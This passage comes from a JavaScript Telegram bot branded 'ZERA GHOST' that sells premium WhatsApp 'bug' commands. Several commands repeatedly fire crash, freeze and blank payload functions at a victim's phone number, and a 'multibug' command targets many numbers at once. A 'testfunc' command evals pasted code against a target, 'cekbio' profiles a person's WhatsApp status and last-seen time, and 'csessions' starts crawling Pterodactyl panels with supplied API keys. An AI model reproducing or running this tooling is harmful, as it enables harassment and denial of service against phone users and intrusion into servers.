`, { loadingText: 'Memuat Proses', reply_markup: { inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${q}`, style: "primary" }]] } });

  const processMessageId = processMsg?.message_id;
  for (let i = 0; i < 20; i++) { await DelayHardKingKaze(sock, target); await sleep(1500); }

  if (processMessageId) { try { await bot.telegram.deleteMessage(ctx.chat.id, processMessageId); } catch (_) {} }
  sendRichPhoto(ctx.telegram, ctx.chat.id, thumbnailUrl, `
<h3>✅ ZERA GHOST — SUKSES</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Target</td><td>${q}</td></tr>
  <tr><td>Type</td><td>Freeze X Crash Hard Bebas Spam</td></tr>
  <tr><td>Status</td><td>✅ Sukses</td></tr>
</table>
`, { loadingText: 'Memuat Hasil', reply_markup: { inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${q}`, style: "primary" }]] } });
});

bot.command("ZeraXDelayHard", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>🪧 FORMAT</h3><hr/><table border="1"><tr><td><code>/ZeraXDelayHard 62xxx</code></td></tr></table>`, { loadingText: 'Memuat Format' });
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const processMsg = await sendRichPhoto(ctx.telegram, ctx.chat.id, thumbnailUrl, `
<h3>⚡ ZERA GHOST — PROCESS</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Target</td><td>${q}</td></tr>
  <tr><td>Type</td><td>Delay Hard Bebas Spam</td></tr>
  <tr><td>Status</td><td>⏳ Process</td></tr>
</table>
`, { loadingText: 'Memuat Proses', reply_markup: { inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${q}`, style: "primary" }]] } });

  const processMessageId = processMsg?.message_id;
  for (let i = 0; i < 20; i++) { await HoloTheSilent(sock, target); await sleep(1500); }

  if (processMessageId) { try { await bot.telegram.deleteMessage(ctx.chat.id, processMessageId); } catch (_) {} }
  sendRichPhoto(ctx.telegram, ctx.chat.id, thumbnailUrl, `
<h3>✅ ZERA GHOST — SUKSES</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Target</td><td>${q}</td></tr>
  <tr><td>Type</td><td>Delay Hard Bebas Spam</td></tr>
  <tr><td>Status</td><td>✅ Sukses</td></tr>
</table>
`, { loadingText: 'Memuat Hasil', reply_markup: { inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${q}`, style: "primary" }]] } });
});

bot.command("ZeraXChat", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>🪧 FORMAT</h3><hr/><table border="1"><tr><td><code>/ZeraXChat 62xxx</code></td></tr></table>`, { loadingText: 'Memuat Format' });
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const processMsg = await sendRichPhoto(ctx.telegram, ctx.chat.id, thumbnailUrl, `
<h3>⚡ ZERA GHOST — PROCESS</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Target</td><td>${q}</td></tr>
  <tr><td>Type</td><td>Delay Chat Hard Bebas Spam</td></tr>
  <tr><td>Status</td><td>⏳ Process</td></tr>
</table>
`, { loadingText: 'Memuat Proses', reply_markup: { inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${q}`, style: "primary" }]] } });

  const processMessageId = processMsg?.message_id;
  for (let i = 0; i < 40; i++) { await ElKaze(sock, target); await sleep(1500); }

  if (processMessageId) { try { await bot.telegram.deleteMessage(ctx.chat.id, processMessageId); } catch (_) {} }
  sendRichPhoto(ctx.telegram, ctx.chat.id, thumbnailUrl, `
<h3>✅ ZERA GHOST — SUKSES</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Target</td><td>${q}</td></tr>
  <tr><td>Type</td><td>Delay Chat Hard Bebas Spam</td></tr>
  <tr><td>Status</td><td>✅ Sukses</td></tr>
</table>
`, { loadingText: 'Memuat Hasil', reply_markup: { inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${q}`, style: "primary" }]] } });
});

bot.command("ZeraXMaklu", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>🪧 FORMAT</h3><hr/><table border="1"><tr><td><code>/ZeraXMaklu 62xxx</code></td></tr></table>`, { loadingText: 'Memuat Format' });
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const processMsg = await sendRichPhoto(ctx.telegram, ctx.chat.id, thumbnailUrl, `
<h3>⚡ ZERA GHOST — PROCESS</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Target</td><td>${q}</td></tr>
  <tr><td>Type</td><td>Delay Hard New Invisible</td></tr>
  <tr><td>Status</td><td>⏳ Process</td></tr>
</table>
`, { loadingText: 'Memuat Proses', reply_markup: { inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${q}`, style: "primary" }]] } });

  const processMessageId = processMsg?.message_id;
  for (let i = 0; i < 15; i++) { await FrezeXdelayTve(sock, target); await sleep(1500); }

  if (processMessageId) { try { await bot.telegram.deleteMessage(ctx.chat.id, processMessageId); } catch (_) {} }
  sendRichPhoto(ctx.telegram, ctx.chat.id, thumbnailUrl, `
<h3>✅ ZERA GHOST — SUKSES</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Target</td><td>${q}</td></tr>
  <tr><td>Type</td><td>Delay Hard New Invisible</td></tr>
  <tr><td>Status</td><td>✅ Sukses</td></tr>
</table>
`, { loadingText: 'Memuat Hasil', reply_markup: { inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${q}`, style: "primary" }]] } });
});

bot.command("ZeraXBlank", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>🪧 FORMAT</h3><hr/><table border="1"><tr><td><code>/ZeraXBlank 62xxx</code></td></tr></table>`, { loadingText: 'Memuat Format' });
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const processMsg = await sendRichPhoto(ctx.telegram, ctx.chat.id, thumbnailUrl, `
<h3>⚡ ZERA GHOST — PROCESS</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Target</td><td>${q}</td></tr>
  <tr><td>Type</td><td>Blank Visible Bebas Spam</td></tr>
  <tr><td>Status</td><td>⏳ Process</td></tr>
</table>
`, { loadingText: 'Memuat Proses', reply_markup: { inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${q}`, style: "primary" }]] } });

  const processMessageId = processMsg?.message_id;
  for (let i = 0; i < 20; i++) { await Tveblank(sock, target); await sleep(1500); }

  if (processMessageId) { try { await bot.telegram.deleteMessage(ctx.chat.id, processMessageId); } catch (_) {} }
  sendRichPhoto(ctx.telegram, ctx.chat.id, thumbnailUrl, `
<h3>✅ ZERA GHOST — SUKSES</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Target</td><td>${q}</td></tr>
  <tr><td>Type</td><td>Blank Visible Bebas Spam</td></tr>
  <tr><td>Status</td><td>✅ Sukses</td></tr>
</table>
`, { loadingText: 'Memuat Hasil', reply_markup: { inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${q}`, style: "primary" }]] } });
});

bot.command("ZeraXCrashNew", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>🪧 FORMAT</h3><hr/><table border="1"><tr><td><code>/ZeraXCrashNew 62xxx</code></td></tr></table>`, { loadingText: 'Memuat Format' });
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const processMsg = await sendRichPhoto(ctx.telegram, ctx.chat.id, thumbnailUrl, `
<h3>⚡ ZERA GHOST — PROCESS</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Target</td><td>${q}</td></tr>
  <tr><td>Type</td><td>Crash Hard New Visible</td></tr>
  <tr><td>Status</td><td>⏳ Process</td></tr>
</table>
`, { loadingText: 'Memuat Proses', reply_markup: { inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${q}`, style: "primary" }]] } });

  const processMessageId = processMsg?.message_id;
  for (let i = 0; i < 20; i++) { await Jirrikyy(sock, target); await sleep(1500); }

  if (processMessageId) { try { await bot.telegram.deleteMessage(ctx.chat.id, processMessageId); } catch (_) {} }
  sendRichPhoto(ctx.telegram, ctx.chat.id, thumbnailUrl, `
<h3>✅ ZERA GHOST — SUKSES</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Target</td><td>${q}</td></tr>
  <tr><td>Type</td><td>Crash Hard New Visible</td></tr>
  <tr><td>Status</td><td>✅ Sukses</td></tr>
</table>
`, { loadingText: 'Memuat Hasil', reply_markup: { inline_keyboard: [[{ text: "Check Target", url: `https://wa.me/${q}`, style: "primary" }]] } });
});

bot.command("iqc", checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fullText = ctx.message.text.replace(/^\/iqc\s+/i, "");
  const [input, batteryInput] = fullText.split(",").map(s => s?.trim());
  if (!input || !batteryInput) return sendRichTG(ctx.telegram, chatId, `<h3>❌ FORMAT</h3><hr/><table border="1"><tr><td><code>/iqc Deryanthetalent,188</code></td></tr></table>`, { loadingText: 'Memuat Format' });
  const battery = parseInt(batteryInput);
  if (isNaN(battery) || battery < 0 || battery > 100) return sendRichTG(ctx.telegram, chatId, `<h3>❌ ERROR</h3><hr/><table border="1"><tr><td>Battery 0-100</td></tr></table>`, { loadingText: 'Memuat Error' });
  const hours = Math.floor(Math.random() * 24).toString().padStart(2, '0');
  const minutes = Math.floor(Math.random() * 60).toString().padStart(2, '0');
  const time = `${hours}:${minutes}`;
  const carriers = ["TELKOMSEL", "INDOSAT OOREDOO", "XL AXIATA", "SMARTFREN", "IM3 (THREE)", "BY.U"];
  const carrier = carriers[Math.floor(Math.random() * carriers.length)];
  const signalStrength = Math.floor(Math.random() * 4) + 1;
  const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(input)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=${signalStrength}&emojiStyle=apple`;
  try {
    await ctx.replyWithChatAction("upload_photo");
    await sendRichMessageDraft(ctx.telegram, chatId, 'Memuat Gambar');
    await delay(getDraftDelay());
    const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data, "binary");
    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `💬 ${input} | 🕒 ${time} | 🔋 ${battery}% | 📡 ${carrier}`,
      reply_markup: { inline_keyboard: [[{ text: "Tokisaki", url: "https://t.me/Testimonideryan" }]] }
    });
  } catch (err) {
    console.error(err.message);
    sendRichTG(ctx.telegram, chatId, `<h3>❌ ERROR</h3><hr/><table border="1"><tr><td>Gagal proses gambar</td></tr></table>`, { loadingText: 'Memuat Error' });
  }
});

bot.command("tourl", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❗ FORMAT</h3><hr/><table border="1"><tr><td>Reply media dengan <code>/tourl</code></td></tr></table>`, { loadingText: 'Memuat Format' });
    let fileId;
    if (reply.photo) fileId = reply.photo[reply.photo.length - 1].file_id;
    else if (reply.video) fileId = reply.video.file_id;
    else if (reply.audio) fileId = reply.audio.file_id;
    else if (reply.document) fileId = reply.document.file_id;
    else return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ ERROR</h3><hr/><table border="1"><tr><td>Format file tidak didukung</td></tr></table>`, { loadingText: 'Memuat Error' });
    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);
    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, { filename: path.basename(fileLink.href), contentType: "application/octet-stream" });
    const uploadRes = await axios.post("https://catbox.moe/user/api.php", form, { headers: form.getHeaders() });
    const url = uploadRes.data;
    sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>✅ UPLOAD BERHASIL</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>URL</td><td><a href="${url}">${url}</a></td></tr>
</table>
`, { loadingText: 'Memuat Upload' });
  } catch (err) {
    console.error("❌ Gagal tourl:", err.message);
    sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ ERROR</h3><hr/><table border="1"><tr><td>Gagal upload ke URL</td></tr></table>`, { loadingText: 'Memuat Error' });
  }
});

const OWNER_ID = [8959202877];

bot.command('testfunc', async (ctx) => {
  const isOwner = OWNER_ID.includes(ctx.from.id);
  if (!isOwner) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ OWNER ONLY</h3>`, { loadingText: 'Memuat Akses' });
  if (!ctx.message.reply_to_message) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>🪧 FORMAT</h3><hr/><table border="1"><tr><td>Reply ke message dengan JavaScript function</td></tr></table>`, { loadingText: 'Memuat Format' });
  const q = ctx.message.text.split(' ').slice(1).join(' ');
  if (!q) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>🪧 FORMAT</h3><hr/><table border="1"><tr><td><code>/testfunc 628xxx,5</code></td></tr></table>`, { loadingText: 'Memuat Format' });
  let [rawTarget, rawLoop] = q.split(',');
  const number = (rawTarget || '').replace(/[^0-9]/g, '');
  if (!number) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ ERROR</h3><hr/><table border="1"><tr><td>Invalid target number</td></tr></table>`, { loadingText: 'Memuat Error' });
  const loop = Number(rawLoop) || 1;
  const target = number;
  const funcCode = ctx.message.reply_to_message.text || ctx.message.reply_to_message.caption || '';
  if (!funcCode.includes('function')) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ ERROR</h3><hr/><table border="1"><tr><td>Replied message not a function</td></tr></table>`, { loadingText: 'Memuat Error' });
  let fn;
  try { fn = eval(`(${funcCode})`); } catch (e) {
    return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ PARSE ERROR</h3><hr/><table border="1"><tr><td>${e.message}</td></tr></table>`, { loadingText: 'Memuat Error' });
  }
  const context = { sendMessage: async (chatId, text, opts = {}) => { return bot.telegram.sendMessage(chatId, text, opts); } };
  sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>⚙️ TESFUNC EXECUTION</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Target</td><td>${number}</td></tr>
  <tr><td>Loop</td><td>${loop}x</td></tr>
</table>
`, { loadingText: 'Memuat Eksekusi' });
  for (let i = 0; i < loop; i++) { try { await fn(bot, target, context); } catch (e) { console.log('[TESFUNC ERROR]', e); } }
  sendRichTG(ctx.telegram, ctx.chat.id, `<h3>✅ DONE</h3><hr/><table border="1"><tr><td>Eksekusi selesai</td></tr></table>`, { loadingText: 'Memuat Hasil' });
});

bot.command("cekfunc", async (ctx) => {
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text) {
    return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ FORMAT</h3><hr/><table border="1"><tr><td>Reply kode JS lalu ketik /cekfunc</td></tr></table>`, { loadingText: 'Memuat Format' });
  }
  const code = ctx.message.reply_to_message.text;
  const wrappedCode = `(async () => { ${code} })();`;
  try {
    new vm.Script(wrappedCode);
    return sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>🟢 SYNTAX CHECK: PASSED</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Status</td><td>Aman, tidak ditemukan error syntax</td></tr>
  <tr><td>Parser</td><td>Node.js V8 Engine</td></tr>
  <tr><td>Mode</td><td>Async Function Wrapper</td></tr>
  <tr><td>Execution</td><td>Diblokir (Syntax-only)</td></tr>
</table>
`, { loadingText: 'Memuat Pengecekan' });
  } catch (err) {
    return sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>🔴 SYNTAX ERROR DETECTED</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Status</td><td>Gagal parse kode</td></tr>
  <tr><td>Engine</td><td>Node.js V8</td></tr>
  <tr><td>Error Type</td><td>${err.name}</td></tr>
  <tr><td>Detail</td><td>${err.message}</td></tr>
</table>
`, { loadingText: 'Memuat Pengecekan' });
  }
});

bot.command("trackweb", async (ctx) => {
  const input = ctx.message.text.split(" ").slice(1).join(" ");
  if (!input) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>⚠️ FORMAT</h3><hr/><table border="1"><tr><td><code>/trackweb https://example.com</code></td></tr></table>`, { loadingText: 'Memuat Format' });
  let url;
  try { url = input.startsWith("http") ? new URL(input) : new URL("https://" + input); }
  catch { return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ URL INVALID</h3>`, { loadingText: 'Memuat Error' }); }
  const domain = url.hostname;
  try {
    const dnsResult = await dns.lookup(domain);
    const res = await axios.get(url.href, { timeout: 10000, validateStatus: () => true });
    const headers = res.headers;
    const server = headers["server"] || "Unknown";
    const powered = headers["x-powered-by"] || "-";
    const cloudflare = headers["cf-ray"] ? "Yes" : "No";
    const ssl = url.protocol === "https:" ? "Enabled" : "Disabled";
    sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>🔍 WEB TRACK RESULT</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>🌐 Domain</td><td>${domain}</td></tr>
  <tr><td>📡 IP</td><td>${dnsResult.address}</td></tr>
  <tr><td>Family</td><td>IPv${dnsResult.family}</td></tr>
</table>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>WebSrv</td><td>${server}</td></tr>
  <tr><td>Powered</td><td>${powered}</td></tr>
  <tr><td>CloudFlare</td><td>${cloudflare}</td></tr>
  <tr><td>HTTPS</td><td>${ssl}</td></tr>
  <tr><td>Status</td><td>${res.status}</td></tr>
  <tr><td>CSP</td><td>${headers["content-security-policy"] ? "Yes" : "No"}</td></tr>
  <tr><td>HSTS</td><td>${headers["strict-transport-security"] ? "Yes" : "No"}</td></tr>
  <tr><td>X-Frame</td><td>${headers["x-frame-options"] ? "Yes" : "No"}</td></tr>
</table>
`, { loadingText: 'Memuat Tracking' });
  } catch (e) {
    console.error(e);
    sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ ERROR</h3><hr/><table border="1"><tr><td>Gagal analisis website</td></tr></table>`, { loadingText: 'Memuat Error' });
  }
});

bot.command("statuswebsite", async (ctx) => {
  const url = ctx.message.text.split(" ")[1];
  if (!url) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ FORMAT</h3><hr/><table border="1"><tr><td><code>/statuswebsite https://example.com</code></td></tr></table>`, { loadingText: 'Memuat Format' });
  let target = url;
  if (!/^https?:\/\//i.test(target)) target = "http://" + target;
  const loading = await sendRichTG(ctx.telegram, ctx.chat.id, `<h3>🔍 CHECKING</h3><hr/><table border="1"><tr><td>Mengecek status website...</td></tr></table>`, { loadingText: 'Memuat Pengecekan' });
  try {
    const start = Date.now();
    const res = await axios.get(target, { timeout: 8000, validateStatus: () => true });
    const ping = Date.now() - start;
    let statusText = "🟢 ONLINE";
    if (res.status >= 400) statusText = "🟠 ERROR RESPONSE";
    if (loading?.message_id) { try { await ctx.telegram.deleteMessage(ctx.chat.id, loading.message_id); } catch (_) {} }
    sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>🌐 STATUS WEBSITE</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>URL</td><td>${target}</td></tr>
  <tr><td>Status</td><td>${statusText}</td></tr>
  <tr><td>HTTP Code</td><td>${res.status}</td></tr>
  <tr><td>Response</td><td>${ping} ms</td></tr>
</table>
<footer>✅ Website masih bisa diakses</footer>
`, { loadingText: 'Memuat Hasil' });
  } catch (err) {
    if (loading?.message_id) { try { await ctx.telegram.deleteMessage(ctx.chat.id, loading.message_id); } catch (_) {} }
    sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>🌐 STATUS WEBSITE</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>URL</td><td>${target}</td></tr>
  <tr><td>Status</td><td>🔴 DOWN</td></tr>
  <tr><td>Response</td><td>Timeout / No Response</td></tr>
</table>
<footer>❌ Website tidak dapat diakses</footer>
`, { loadingText: 'Memuat Hasil' });
  }
});

bot.command("multibug", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ");
  if (!args) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ FORMAT</h3><hr/><table border="1"><tr><td><code>/multibug 62xxx, 62xxxx</code></td></tr></table>`, { loadingText: 'Memuat Format' });
  const numbers = args.split(",").map(v => v.replace(/[^0-9]/g, "")).filter(v => v.length > 5);
  if (numbers.length === 0) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ ERROR</h3><hr/><table border="1"><tr><td>Tidak ada nomor valid</td></tr></table>`, { loadingText: 'Memuat Error' });
  const targets = numbers.map(n => n + "@s.whatsapp.net");
  const totalTarget = targets.length;
  const progressMsg = await sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>🚀 MULTI BUG STARTED</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Total Target</td><td>${totalTarget}</td></tr>
  <tr><td>Progress</td><td>0%</td></tr>
</table>
`, { loadingText: 'Memuat Proses' });
  for (let index = 0; index < targets.length; index++) {
    const target = targets[index];
    const current = index + 1;
    const percent = Math.floor((current / totalTarget) * 100);
    if (progressMsg?.message_id) { try { await ctx.telegram.deleteMessage(ctx.chat.id, progressMsg.message_id); } catch (_) {} }
    await sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>⚡ MULTI BUG IN PROGRESS</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Target</td><td>${target.replace("@s.whatsapp.net", "")}</td></tr>
  <tr><td>Urutan</td><td>${current} / ${totalTarget}</td></tr>
  <tr><td>Progress</td><td>${percent}%</td></tr>
</table>
`, { loadingText: 'Memuat Proses' });
    const loopBug = 20;
    for (let i = 0; i < loopBug; i++) {
      await sleep(1000);
      console.log(`⚔️ MULTI NUMBER BUG → ${target} | Loop ${i + 1}/${loopBug}`);
    }
    await sleep(1500);
  }
  await sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>✅ MULTI BUG COMPLETED</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Total Target</td><td>${totalTarget}</td></tr>
  <tr><td>Progress</td><td>100%</td></tr>
  <tr><td>Status</td><td>✅ All processed</td></tr>
</table>
`, { loadingText: 'Memuat Hasil' });
});

bot.command("cekid", async (ctx) => {
  if (!ctx.message) return;
  let target;
  if (ctx.message.reply_to_message) {
    target = ctx.message.reply_to_message.from;
  } else {
    return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>⚠️ FORMAT</h3><hr/><table border="1"><tr><td>Reply pesan user untuk cek ID</td></tr></table>`, { loadingText: 'Memuat Format' });
  }
  if (!target.username) {
    return sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>❌ GAGAL CEK USER</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Nama</td><td>${target.first_name}</td></tr>
  <tr><td>Username</td><td>Tidak ada</td></tr>
</table>
`, { loadingText: 'Memuat Data' });
  }
  sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>✅ USER DITEMUKAN</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Nama</td><td>${target.first_name}</td></tr>
  <tr><td>ID</td><td><code>${target.id}</code></td></tr>
  <tr><td>Username</td><td>@${target.username}</td></tr>
</table>
`, { loadingText: 'Memuat Data' });
});

bot.command("cekbio", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>👀 FORMAT</h3><hr/><table border="1"><tr><td><code>/cekbio 62xxx</code></td></tr></table>`, { loadingText: 'Memuat Format' });
  const q = args[1];
  const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  const processMsg = await sendRichPhoto(ctx.telegram, ctx.chat.id, thumbnailUrl, `
<h3>🔍 CHECKING BIO</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Target</td><td>${q}</td></tr>
  <tr><td>Status</td><td>⏳ Checking...</td></tr>
</table>
`, { loadingText: 'Memuat Proses' });
  try {
    const contact = await sock.onWhatsApp(target);
    if (!contact || contact.length === 0) {
      if (processMsg?.message_id) { try { await bot.telegram.deleteMessage(ctx.chat.id, processMsg.message_id); } catch (_) {} }
      return sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>❌ NOT FOUND</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Target</td><td>${q}</td></tr>
  <tr><td>Status</td><td>❌ Not Found</td></tr>
  <tr><td>Message</td><td>Nomor tidak terdaftar di WhatsApp</td></tr>
</table>
`, { loadingText: 'Memuat Hasil' });
    }
    const contactDetails = await sock.fetchStatus(target).catch(() => null);
    const profilePicture = await sock.profilePictureUrl(target, 'image').catch(() => null);
    const bio = contactDetails?.status || "Tidak ada bio";
    const lastSeen = contactDetails?.lastSeen ? moment(contactDetails.lastSeen).tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss') : "Tidak tersedia";
    if (processMsg?.message_id) { try { await bot.telegram.deleteMessage(ctx.chat.id, processMsg.message_id); } catch (_) {} }
    if (profilePicture) {
      try { await ctx.replyWithPhoto(profilePicture, { caption: `📱 ${q}` }); } catch (_) {}
    }
    sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>📋 BIO INFORMATION</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>📱 Nomor</td><td>${q}</td></tr>
  <tr><td>👤 Status</td><td>✅ Terdaftar</td></tr>
  <tr><td>📝 Bio</td><td>${bio}</td></tr>
  <tr><td>👀 Last Seen</td><td>${lastSeen}</td></tr>
  <tr><td>🖼 Profile Pic</td><td>${profilePicture ? "✅ Tersedia" : "❌ Tidak tersedia"}</td></tr>
  <tr><td>🕐 Diperiksa</td><td>${moment().tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss')}</td></tr>
</table>
`, { loadingText: 'Memuat Hasil', reply_markup: { inline_keyboard: [[{ text: "📱 Chat Target", url: `https://wa.me/${q}`, style: "primary" }]] } });
  } catch (error) {
    if (processMsg?.message_id) { try { await bot.telegram.deleteMessage(ctx.chat.id, processMsg.message_id); } catch (_) {} }
    sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ ERROR</h3><hr/><table border="1"><tr><td>Gagal mengambil data bio</td></tr></table>`, { loadingText: 'Memuat Error' });
  }
});

bot.command("csessions", checkPremium, async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>🪧 FORMAT</h3><hr/><table border="1"><tr><td><code>/csessions domain,ptla,ptlc</code></td></tr></table>`, { loadingText: 'Memuat Format' });
  const args = text.split(",");
  const domain = args[0], plta = args[1], pltc = args[2];
  if (!plta || !pltc) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>🪧 FORMAT</h3><hr/><table border="1"><tr><td><code>/csessions domain,ptla,ptlc</code></td></tr></table>`, { loadingText: 'Memuat Format' });
  await sendRichTG(ctx.telegram, ctx.chat.id, `<h3>⏳ SCANNING</h3><hr/><table border="1"><tr><td>Sedang scan semua server...</td></tr></table>`, { loadingText: 'Memuat Scan' });
  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = { Accept: "application/json, application/vnd.pterodactyl.v1+json", Authorization: `Bearer ${plta}` };
  const commonHeadersClient = { Accept: "application/json, application/vnd.pterodactyl.v1+json", Authorization: `Bearer ${pltc}` };
  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return a.type === "dir" || a.type === "directory" || a.mode === "dir" || a.mode === "directory" || a.mode === "d" || a.is_directory === true || a.isDir === true;
  }
  async function listAllServers() {
    const out = []; let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, { params: { page }, headers: commonHeadersApp, timeout: 15000 }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }
  async function traverseAndFind(identifier, dir = "/") {
    try {
